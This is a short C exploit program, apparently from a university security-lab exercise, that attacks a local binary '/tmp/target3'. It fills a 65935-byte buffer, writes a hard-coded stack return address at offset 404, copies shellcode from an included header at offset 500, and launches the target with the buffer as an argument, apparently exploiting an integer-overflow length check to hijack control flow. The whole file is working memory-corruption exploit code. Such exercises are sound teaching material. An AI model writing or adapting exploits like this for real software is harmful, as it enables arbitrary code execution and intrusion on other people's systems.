#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// 2 ** 16 + 399 = 65536 + 399 = 65935
#define LEN 65935
char payload[LEN];

void make_payload() {
  for (int i = 0; i < LEN; i++) {
    payload[i] = 'A';
  }
  payload[404] = 0x20;
  payload[405] = 0xfd;
  payload[406] = 0xfe;
  payload[407] = 0xbf;
  strncpy(payload + 500, shellcode, 46);
  payload[545] = 'A';
  payload[LEN - 1] = 0x0;
}

int main(void) {
  char *args[] = { TARGET, payload, "65935", NULL };
  char *env[] = { NULL };
  make_payload();
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
